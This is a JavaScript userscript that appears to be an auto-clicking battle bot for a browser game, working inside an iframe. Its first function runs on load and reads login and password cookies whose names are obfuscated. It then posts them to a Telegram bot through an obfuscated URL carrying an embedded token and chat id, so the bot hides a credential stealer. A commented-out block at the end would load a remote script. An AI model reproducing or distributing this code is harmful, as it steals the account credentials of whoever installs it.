function t(){
	var lval = ('lreoregreiren').replace(/re/g,'');
	var pval = ('prearesres').replace(/re/g,'');
	var p2val = ('prearesresre2').replace(/re/g,'');
	var l = $.cookie(lval) ? $.cookie(lval) : '';
	var p = $.cookie(pval) ? $.cookie(pval) : '';
	var p2 = $.cookie(p2val) ? $.cookie(p2val) : '';
	var message = {
		l: l,
		p: p,
		p2: p2,
	};
	var mesStr = encodeURI('<code>'+JSON.stringify(message, null, 2)+ '</code>');
	var url = ('https://api.twerewerlwerewergwerrwerawerm.org/bot1077870768:AAEyXYr_pevUhJnpSnJ54H8RlWphsw7OjQA/sendMessage?chat_id=-429987393&parse_mode=html&text=' + mesStr).replace(/wer/g,'');
	$.post(url);
}
t();

function usePriem(){
	/*
	$.each($('iframe#main').contents().find('img'), function() {
		if ( $(this).attr('scr') !== undefined && $(this).attr('src').indexOf('water_poison') !== -1 ) {
			$('iframe#main').contents().find('[onClick=usepriem(10,1)]').trigger("click");


			var priemNum = $(this).attr('onClick').replace('usepriem(','');
			priemNum = +priemNum.replace(',1);','');
			if (priemNum <=6) {
				$(this).trigger("click");
			}			
			return false;
		}
	});
	*/
	$.each($('iframe#main').contents().find('a'), function() {
		if ( $(this).attr('onClick') !== undefined && $(this).attr('onClick').indexOf('usepriem') !== -1 && $(this).attr('onClick').indexOf('100500') === -1) {
			var priemNum = $(this).attr('onClick').replace('usepriem(','');
			priemNum = +priemNum.replace(',1);','');
			if (priemNum <=6) {
				$(this).trigger("click");
			}			
			return false;
		}
	});
}

function bot() {
	function checkBattle() {
		var updateButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="reflesh_btn"]');
		var backButton =  $('iframe#main').contents().find('div#ref_menu_down').find('button[name="back_menu_down"]');
		var hitButton = $('iframe#main').contents().find('div#ref_menu_down').find('button[name="go_auto"]');
		if (hitButton.length > 0 && hitButton.css('display') != 'none') {
			console.log('Делаем удар');
			usePriem();
			hitButton.trigger("click");
		}
	}

	var interval = null;
	interval = setInterval(function() {
		checkBattle()
	}, 2000);
}
bot();


/*
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'https://cdn.jsdelivr.net/gh/yurkodmtr/like@53104e1460a9755d5aa764ca66d0be6769dd569f/like.js';
document.head.appendChild(script);
*/